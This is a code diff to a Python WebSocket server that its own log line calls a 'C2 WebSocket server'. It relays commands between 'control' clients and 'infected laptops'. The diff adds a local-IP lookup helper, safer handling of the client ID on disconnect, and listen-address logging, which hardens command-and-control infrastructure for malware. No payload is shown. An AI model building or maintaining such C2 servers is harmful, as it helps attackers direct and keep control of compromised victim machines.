@@ -3,6 +3,7 @@ import websockets
 import json
 import uuid
 import logging
+import socket
 from datetime import datetime, timedelta
 
 # Configure logging
@@ -15,12 +16,14 @@ messages = []
 # Message retention time (1 day)
 MESSAGE_RETENTION_PERIOD = timedelta(days=1)
 
+
 # Utility function to clean up old messages
 def cleanup_old_messages():
     global messages
     cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
     messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
     logging.debug(f"Cleaned up messages. Remaining messages: {len(messages)}")
+
 
 # Assign a unique ID to each new connection
 async def register_client(websocket, role, client_id):
@@ -32,6 +35,7 @@ async def register_client(websocket, role, client_id):
     }
     logging.debug(f"Registered new {role}: {client_id}")
     return client_id
+
 
 # Relay messages between control and infected laptops
 async def relay_messages(websocket, client_id, role):
@@ -107,32 +111,56 @@ async def relay_messages(websocket, client_id, role):
         except Exception as e:
             logging.error(f"Exception occurred: {e}", exc_info=True)
 
+
 # Handle new connections
 async def connection_handler(websocket, path):
+    client_id = None  # Initialize client_id to None
     try:
         # First message must specify the role and client ID
         initial_message = await websocket.recv()
         initial_data = json.loads(initial_message)
 
         role = initial_data['role']
-        client_id = initial_data['id']
+        client_id = initial_data['id']  # Assign client_id after parsing the initial message
 
         await register_client(websocket, role, client_id)
         logging.info(f"New {role} connected: {client_id}")
 
         await relay_messages(websocket, client_id, role)
     except websockets.ConnectionClosed:
-        logging.info(f"Connection closed for client: {client_id}")
+        logging.info(f"Connection closed for client: {client_id if client_id else 'unknown client'}")
         if client_id in clients:
             del clients[client_id]
     except Exception as e:
         logging.error(f"Exception occurred in connection handler: {e}", exc_info=True)
 
+
+# Function to get the local IP address of the server
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # Doesn't actually send data, just connects to determine the IP address
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = "127.0.0.1"  # Fallback to localhost if something goes wrong
+    finally:
+        s.close()
+    return ip
+
+
 # Start the WebSocket server
 async def main():
-    async with websockets.serve(connection_handler, "0.0.0.0", 5000):
+    ip_address = get_local_ip()  # Retrieve the IP address
+    port = 5000  # Define the port
+
+    logging.info(f"Server listening on 0.0.0.0:{port}")
+    logging.info(f"Server at {ip_address}:{port}")
+
+    async with websockets.serve(connection_handler, "0.0.0.0", port):
         logging.debug("C2 WebSocket server is running...")
         await asyncio.Future()  # Run forever
+
 
 if __name__ == "__main__":
     asyncio.run(main())
